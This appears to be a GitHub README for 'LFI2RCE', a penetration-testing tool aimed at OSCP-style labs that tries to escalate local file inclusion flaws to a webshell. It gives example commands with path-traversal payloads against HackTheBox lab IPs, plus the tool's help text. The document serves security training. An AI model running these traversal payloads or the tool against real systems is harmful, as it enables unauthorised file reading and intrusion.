LFI2RCE
====

## Overview
LFI to RCE tool for OSCP.
## Description
This tool is used to exploit an LFI vulnerability to obtain a Webshell.
If you give a vulnerable URL to LFI, it will try LFI of a common file.
It does not have autopwn function, so it can be used in OSCP Exam.  
It is forbidden to use it for anything other than penetration testing.
## Demo
#### HackTheBox Poison.
![LFI-Poison](https://user-images.githubusercontent.com/56021519/81492511-44e78600-92d3-11ea-9ce5-1aade0b48f16.gif)
#### HackTheBox Beep.
![LFI-Beep](https://user-images.githubusercontent.com/56021519/81493157-110f5f00-92d9-11ea-9def-69563a7f7ded.gif)
## Example
```txt
root@kali:/# python lfi2rce.py --linux --username charix 10.10.10.84 /browse.php?file=../../../../../..  --error "failed to open stream" -v
```
```txt
root@kali:/# python lfi2rce.py --ssl --dir-file LFI-FD-check.txt 10.10.10.7 /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../.. -v --nullbyte -o beep-files
```
## Requirement
```txt
root@kali:/# pip3 install requests
```
## Usage
```txt
root@kali:/# python lfi2rce.py -h
                    _     _____ ___ ____  ____   ____ _____  
                   | |   |  ___|_ _|___ \|  _ \ / ___| ____| 
                   | |   | |_   | |  __) | |_) | |   |  _|   
                   | |___|  _|  | | / __/|  _ <| |___| |___  
                   |_____|_|   |___|_____|_| \_\____|_____| 
usage: lfi2rce.py [-h] [--nullbyte] [--ssl] [--dir-file DIR_FILE] [--windows]
                  [--linux] [--username USERNAME] [--debug] [--error ERROR]
                  [-p PORT] [-v] [-k] [-o OUTDIR] [-s]
                  host path

brute force common file

positional arguments:
  host                  IP address to scan. Example: 127.0.0.1
  path                  Local file inclusion path. Example:
                        /browser.php?file=/../../../../..

optional arguments:
  -h, --help            show this help message and exit
  --nullbyte            terminate the url with null byte
  --ssl                 Use SSL for connection (https)
  --dir-file DIR_FILE   Input file for directory brute force
  --windows             Windows server
  --linux               linux server
  --username USERNAME   enter username if you know.
  --debug               Complete setup without running against host
  --error ERROR         Enter Error Messgage. Example: "No such file or
                        directory" "failed to open stream"
  -p PORT, --port PORT  Target port. Default: http 80 https 443
  -v, --verbose         Verbose output
  -k, --verify-ssl      Verify SSL certificates
  -o OUTDIR, --outdir OUTDIR
                        Write output to this directory
  -s, --show-output     show results to screen
root@kali:/# 
```
